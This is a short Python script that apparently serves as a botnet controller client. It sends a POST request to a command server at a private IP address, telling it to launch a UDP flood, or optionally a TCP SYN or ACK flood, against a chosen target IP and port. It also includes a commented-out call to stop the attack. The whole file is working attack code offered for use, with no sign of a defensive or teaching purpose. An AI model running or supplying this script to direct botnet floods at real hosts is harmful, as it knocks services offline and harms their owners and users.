import requests

# IP that you want to attack
IP = '192.168.200.52'

# ---------------------------tcp_attack -----------------------------
# -------mode-------
# S: SYN Flood
# A: ACK Flood
# ------------------
# my_data = {'attack':'tcp_attack', 'IP':IP, 'port':'80', 'mode':'A'}
# -------------------------------------------------------------------

# ---------------------------udp_attack------------------------------
my_data = {'attack':'udp_attack', 'IP':IP, 'port':'80'}
# -------------------------------------------------------------------

# Botnet URL
url = 'http://192.168.200.55:9999/'

# start attak
start_url = url + 'start'
r = requests.post(start_url, data=my_data)

# stop attack
# stop_url = url + 'stop'
# r = requests.get(stop_url)
